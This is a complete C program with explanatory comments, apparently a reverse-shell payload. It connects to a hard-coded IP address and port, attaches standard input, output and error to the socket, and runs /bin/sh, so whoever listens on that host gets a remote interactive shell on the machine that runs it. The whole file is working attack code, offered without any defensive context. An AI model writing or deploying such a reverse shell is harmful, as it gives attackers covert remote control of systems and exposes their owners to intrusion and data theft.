// Include the necessary libraries for network and system operations
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    // Declare the variables
    int shell;  // This will be the socket
    struct sockaddr_in shell_addr;  // This structure will hold the server's address
    char ip_addr[] = "192.168.247.82";  // The server's IP address
    int port = 8081;  // The port we'll connect to
    char recv_server[512];  // A buffer to hold data received from the server
    int connection;  // This will hold the return value of connect()

    // Create a socket
    shell = socket(AF_INET, SOCK_STREAM, 0);
    if (shell == -1) {
        printf("Socket creation failed\n");
        return 1;
    }

    // Set up the server's address and port number
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_port = htons(port);
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    // Connect to the server
    connection = connect(shell, (struct sockaddr*)&shell_addr, sizeof(shell_addr));
    if (connection == -1) {
        printf("Connection failed\n");
        return 1;
    }

    // Receive data from the server
    recv(shell, recv_server, sizeof(recv_server), 0);

    // Redirect standard input, output, and error to the socket
    dup2(shell, 0);//input 
    dup2(shell, 1); //output
    dup2(shell, 2); //error

    // Execute a new process
    execl("/bin/sh", "sh", NULL); 

    return 0;
}
